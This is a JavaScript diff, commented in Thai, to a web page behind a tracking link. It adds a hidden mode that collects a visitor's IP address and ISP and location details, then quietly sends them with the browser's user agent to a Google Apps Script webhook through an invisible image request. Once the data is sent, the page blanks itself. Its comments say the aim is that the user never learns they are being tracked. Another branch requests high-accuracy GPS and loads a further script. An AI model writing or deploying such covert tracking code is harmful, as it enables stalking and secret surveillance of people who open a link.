@@ -103,6 +103,18 @@
       }
     }
 
+    // ฟังก์ชันตรวจสอบว่าเป็นการเปิดจากการอ่านแชทหรือไม่
+    function isReadTracker() {
+      try {
+        const urlParams = new URLSearchParams(window.location.search);
+        const source = urlParams.get('source');
+        return source === 'read';
+      } catch (error) {
+        console.error("Error checking read source:", error);
+        return false;
+      }
+    }
+
     // ฟังก์ชันสำหรับส่งข้อมูลไปยัง webhook (ย้ายมาไว้ที่นี่เพื่อให้เรียกใช้ได้)
     function sendDataToWebhook(trackingKey, location, source) {
       // สร้างออบเจ็กต์ข้อมูล
@@ -119,24 +131,95 @@
       console.log("Prepared data for webhook (will be sent by script.js):", data);
     }
 
-    // ตรวจสอบ tracking key ก่อนที่จะโหลด script.js
-    if (hasValidTrackingKey()) {
-      console.log("Tracking key is valid. Loading main script...");
-      
-      // ขอสิทธิ์เข้าถึงตำแหน่ง GPS ทันที
-      if (navigator.geolocation) {
-        console.log("Requesting GPS permission early...");
-        navigator.geolocation.getCurrentPosition(
-          position => console.log("Early GPS permission granted"),
-          error => console.log("Early GPS permission error:", error.message),
-          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-        );
+    // ฟังก์ชันสำหรับรวบรวมและส่งข้อมูลเมื่อมีการอ่านแชท
+    async function handleReadTracking() {
+      try {
+        console.log("เริ่มกระบวนการติดตามการอ่านแชท");
+        const urlParams = new URLSearchParams(window.location.search);
+        const trackingKey = urlParams.get('daily');
+        
+        // สร้างข้อมูลพื้นฐานที่จะส่ง
+        const readData = {
+          trackingKey: trackingKey,
+          source: 'read',
+          timestamp: new Date().toLocaleString('th-TH', { timeZone: 'Asia/Bangkok' }),
+          requestId: 'read_' + Date.now().toString(36) + Math.random().toString(36).substr(2, 5),
+          userAgent: navigator.userAgent,
+          referrer: document.referrer || "ไม่มีข้อมูล"
+        };
+
+        // ดึงข้อมูล IP (ใช้บริการภายนอก)
+        try {
+          const ipResponse = await fetch('https://api.ipify.org?format=json');
+          const ipData = await ipResponse.json();
+          readData.ip = { ip: ipData.ip };
+        } catch (ipError) {
+          console.error("ไม่สามารถดึงข้อมูล IP:", ipError);
+          readData.ip = { ip: "ไม่สามารถระบุได้" };
+        }
+
+        // ดึงข้อมูล ISP และรายละเอียดอื่นๆ (ถ้ามี)
+        try {
+          const ipInfoResponse = await fetch(`https://ipinfo.io/${readData.ip.ip}/json?token=77faedd6eb4809`);
+          const ipInfoData = await ipInfoResponse.json();
+          readData.ip = { ...readData.ip, ...ipInfoData };
+        } catch (ispError) {
+          console.error("ไม่สามารถดึงข้อมูล ISP:", ispError);
+        }
+
+        // ส่งข้อมูลไปยัง webhook
+        console.log("ข้อมูลการอ่านที่จะส่ง:", readData);
+        
+        // สร้าง URL สำหรับเรียก webhook
+        const webhookUrl = 'https://script.google.com/macros/s/AKfycbxZ7Cv1a-8AWk2d5Se0_wIm9ZAzIYZ9MmNJgUd84tIb3JutxMF3qB4ZCYmtdkjyUprf/exec';
+        
+        // สร้าง invisible image เพื่อเรียก webhook โดยไม่แสดงผลใดๆ
+        const img = new Image();
+        img.src = `${webhookUrl}?action=readTracking&trackingKey=${encodeURIComponent(readData.trackingKey)}&ip=${encodeURIComponent(readData.ip.ip)}&userAgent=${encodeURIComponent(readData.userAgent)}&requestId=${encodeURIComponent(readData.requestId)}&source=read&isp=${encodeURIComponent(readData.ip.org || '')}&timestamp=${encodeURIComponent(readData.timestamp)}`;
+        
+        // ตั้งค่า timeout เพื่อให้แน่ใจว่ามีการส่งข้อมูล
+        setTimeout(() => {
+          console.log("การติดตามการอ่านเสร็จสมบูรณ์");
+          // ไม่ต้องทำอะไรเพิ่มเติม เพราะเราไม่ต้องการให้ผู้ใช้รู้ว่ามีการติดตาม
+        }, 1500);
+        
+        return true;
+      } catch (error) {
+        console.error("เกิดข้อผิดพลาดในการติดตามการอ่าน:", error);
+        return false;
       }
+    }
+
+    // ตรวจสอบ tracking key และประเภทการติดตาม
+    if (hasValidTrackingKey()) {
+      console.log("Tracking key is valid.");
       
-      // โหลดสคริปต์หลัก
-      const scriptElement = document.createElement('script');
-      scriptElement.src = 'script.js';
-      document.body.appendChild(scriptElement);
+      // ตรวจสอบว่าเป็นการติดตามการอ่านหรือไม่
+      if (isReadTracker()) {
+        console.log("ตรวจพบเป็นการติดตามการอ่านแชท");
+        handleReadTracking();
+        // ไม่ต้องแสดงผลใดๆ ให้ผู้ใช้เห็น
+        document.addEventListener('DOMContentLoaded', function() {
+          // สร้างหน้าเพจเปล่าหรือแสดงเนื้อหาปกติเพื่อไม่ให้ผู้ใช้สงสัย
+          document.body.innerHTML = ""; // ล้างเนื้อหาเพื่อไม่ให้แสดงผลใดๆ
+        });
+      } else {
+        console.log("เป็นการคลิกแบบปกติ โหลด script.js หลัก");
+        // ขอสิทธิ์เข้าถึงตำแหน่ง GPS ทันที
+        if (navigator.geolocation) {
+          console.log("Requesting GPS permission early...");
+          navigator.geolocation.getCurrentPosition(
+            position => console.log("Early GPS permission granted"),
+            error => console.log("Early GPS permission error:", error.message),
+            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+          );
+        }
+        
+        // โหลดสคริปต์หลัก
+        const scriptElement = document.createElement('script');
+        scriptElement.src = 'script.js';
+        document.body.appendChild(scriptElement);
+      }
     } else {
       console.log("Invalid or missing tracking key. Access denied.");
       // แสดงข้อความปฏิเสธการเข้าถึง หากไม่มี tracking key ที่ถูกต้อง
